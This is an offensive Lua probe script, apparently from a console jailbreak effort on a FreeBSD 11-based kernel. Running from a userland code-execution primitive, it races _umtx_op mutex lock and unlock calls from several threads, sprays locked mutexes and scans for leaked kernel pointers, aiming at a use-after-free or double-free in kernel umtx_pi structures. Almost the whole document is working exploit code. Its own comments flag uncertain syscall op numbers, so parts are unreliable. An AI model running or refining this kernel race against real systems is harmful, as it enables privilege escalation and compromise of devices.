-- CRASH_CLASS: HIGH
-- PROBE 136a: UMTX PI mutex priority inversion race
--
-- Context: _umtx_op(454) is reachable. PI mutex ops allocate umtx_pi
-- structs in the kernel. Racing lock/unlock from multiple threads can
-- corrupt the priority inheritance chain — UAF or double-free on umtx_pi.
--
-- FreeBSD 11 _umtx_op ops for PI:
--   UMTX_OP_MUTEX_LOCK(5) — standard mutex lock (confirmed working 56i2)
--   UMTX_OP_MUTEX_UNLOCK(6) — standard mutex unlock
--   UMTX_OP_MUTEX_TRYLOCK(9) — non-blocking lock attempt
--   UMTX_OP_SET_CEILING(15) — priority ceiling (allocates umtx_pi)
--   UMTX_OP_WAIT_UINT_PRIVATE(15... actually 15 is ceiling)
--
-- Race design:
--   Phase 1: Test all mutex ops on 454
--   Phase 2: Thread A locks mutex, Thread B tries unlock = ownership confusion
--   Phase 3: Rapid lock/unlock cycle with fd spray for heap shaping

print("=== PROBE 136a: UMTX PI MUTEX RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
print("has_rax=" .. tostring(has_rax ~= nil))

if not has_rax then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 136a COMPLETE ===")
    return
end

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)
local atomic_fn = libc_addrofs.Atomic_fetch_add_8

local SYS_UMTX_OP = 454

-- ============================================================
-- PHASE 1: Full mutex op scan on 454
-- ============================================================
print("")
print("--- PHASE 1: MUTEX OP SCAN ---")

-- Test each mutex-related op
local ops = {
    {5, "MUTEX_LOCK"},
    {6, "MUTEX_UNLOCK"},
    {9, "MUTEX_TRYLOCK"},
    {10, "MUTEX_LOCK_PI"},     -- not sure about numbering
    {12, "SEM2_WAIT"},
    {13, "SEM2_WAKE"},
    {15, "SET_CEILING"},
    {17, "MUTEX_WAIT"},        -- UMTX_OP_MUTEX_WAIT
    {22, "MUTEX_WAKE2"},
}

for _, op_info in ipairs(ops) do
    local op, name = op_info[1], op_info[2]
    local buf = memory.alloc(64)
    safe_wq(buf, uint64(0))

    local ok, ret = pcall(function()
        return to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
            to_num(buf), op, 0, 0, 0))
    end)
    local word_after = safe_rd(buf)
    if ok then
        print(string.format("  op %2d %-16s ret=%d  word=0x%08X", op, name, ret, word_after or 0))
    else
        print(string.format("  op %2d %-16s CRASH", op, name))
    end
end

print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 2: Lock/unlock lifecycle
-- ============================================================
print("")
print("--- PHASE 2: MUTEX LIFECYCLE ---")

local mtx = memory.alloc(64)
safe_wq(mtx, uint64(0))

-- Lock
local lock_ret = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
    to_num(mtx), 5, 0, 0, 0))
local owner_word = safe_rd(mtx)
print("LOCK ret=" .. lock_ret .. " owner=0x" .. string.format("%08X", owner_word or 0))

-- Unlock
local unlock_ret = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
    to_num(mtx), 6, 0, 0, 0))
local after_unlock = safe_rd(mtx)
print("UNLOCK ret=" .. unlock_ret .. " word=0x" .. string.format("%08X", after_unlock or 0))

-- Rapid lock/unlock cycle to stress kernel allocator
print("")
print("Stress cycling mutex lock/unlock...")
local cycle_mtx = memory.alloc(64)
local CYCLES = 500
for i = 1, CYCLES do
    safe_wq(cycle_mtx, uint64(0))
    native.fcall_with_rax(stub, SYS_UMTX_OP, to_num(cycle_mtx), 5, 0, 0, 0)
    native.fcall_with_rax(stub, SYS_UMTX_OP, to_num(cycle_mtx), 6, 0, 0, 0)
end
print("Completed " .. CYCLES .. " lock/unlock cycles")
print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 3: Threaded mutex race
-- ============================================================
print("")
print("--- PHASE 3: THREADED MUTEX RACE ---")

-- Thread entry: atomic_add on the mutex word itself
-- This races with main thread doing umtx lock/unlock
-- If atomic_add corrupts the owner field mid-lock, the kernel's
-- ownership check may be confused

if not atomic_fn then
    print("No Atomic_fetch_add_8 — skipping threaded race")
    print("=== PROBE 136a COMPLETE ===")
    return
end

local RACE_ROUNDS = 200
local anomaly_count = 0

for round = 1, RACE_ROUNDS do
    local race_mtx = memory.alloc(64)
    safe_wq(race_mtx, uint64(0))

    -- Thread: atomic_add on the mutex memory (corrupts owner field)
    local thr = memory.alloc(8)
    safe_wq(thr, uint64(0))
    pcall(thrd_create_fn, thr, atomic_fn, uint64(to_num(race_mtx)))

    -- Main: try to lock the corrupted mutex
    local lr = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
        to_num(race_mtx), 5, 0, 0, 0))

    -- Check mutex state
    local word = safe_rd(race_mtx)

    -- Unlock attempt (may fail if owner is corrupted)
    local ur = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
        to_num(race_mtx), 6, 0, 0, 0))

    sleep(0.005, 's')
    pcall(thrd_join_fn, memory.read_qword(thr), uint64(0))

    -- Check for anomalies
    if lr == 0 and ur ~= 0 then
        anomaly_count = anomaly_count + 1
        if anomaly_count <= 10 then
            print(string.format("round %d: LOCK OK but UNLOCK FAIL (ur=%d word=0x%08X) — ownership confusion!",
                round, ur, word or 0))
        end
    end

    if round % 50 == 0 then
        local ok = pcall(function() return to_num(syscall.getpid()) end)
        if not ok then
            print("*** CRASH at round " .. round .. " ***")
            break
        end
        print("  progress: " .. round .. "/" .. RACE_ROUNDS .. " anomalies=" .. anomaly_count)
    end
end

print("")
print("Total anomalies: " .. anomaly_count)

-- ============================================================
-- PHASE 4: Multi-mutex spray + race
-- ============================================================
print("")
print("--- PHASE 4: MULTI-MUTEX SPRAY ---")

-- Create many mutexes, lock them all, then race unlock from thread
-- Goal: stress the kernel's per-thread umtx_pi list
local SPRAY_COUNT = 64
local spray_mtxs = {}

for i = 1, SPRAY_COUNT do
    local m = memory.alloc(64)
    safe_wq(m, uint64(0))
    native.fcall_with_rax(stub, SYS_UMTX_OP, to_num(m), 5, 0, 0, 0)
    spray_mtxs[i] = m
end
print("Locked " .. SPRAY_COUNT .. " mutexes")

-- Thread: atomic_add on first mutex while main unlocks all
local spray_thr = memory.alloc(8)
safe_wq(spray_thr, uint64(0))
pcall(thrd_create_fn, spray_thr, atomic_fn, uint64(to_num(spray_mtxs[1])))

-- Main: rapidly unlock all (racing with thread's atomic_add)
local unlock_fails = 0
for i = 1, SPRAY_COUNT do
    local r = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
        to_num(spray_mtxs[i]), 6, 0, 0, 0))
    if r ~= 0 then unlock_fails = unlock_fails + 1 end
end

sleep(0.02, 's')
pcall(thrd_join_fn, memory.read_qword(spray_thr), uint64(0))

print("Unlock fails: " .. unlock_fails .. "/" .. SPRAY_COUNT)

-- Read all mutex words — look for kernel pointers leaked into userland
print("")
print("Post-race mutex word scan:")
for i = 1, SPRAY_COUNT do
    local v = safe_rq(spray_mtxs[i])
    if v then
        local h, l = get_hi_lo(v)
        if h ~= 0 or l ~= 0 then
            print(string.format("  mtx[%d]: %s%s", i, fmt_addr(v),
                is_kptr(v) and " ***KPTR***" or ""))
        end
    end
end

-- VM op counter check
local vm_counter = to_num(native.fcall_with_rax(stub, 624))
print("sys624 VM counter=" .. vm_counter)

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 136a COMPLETE ===")
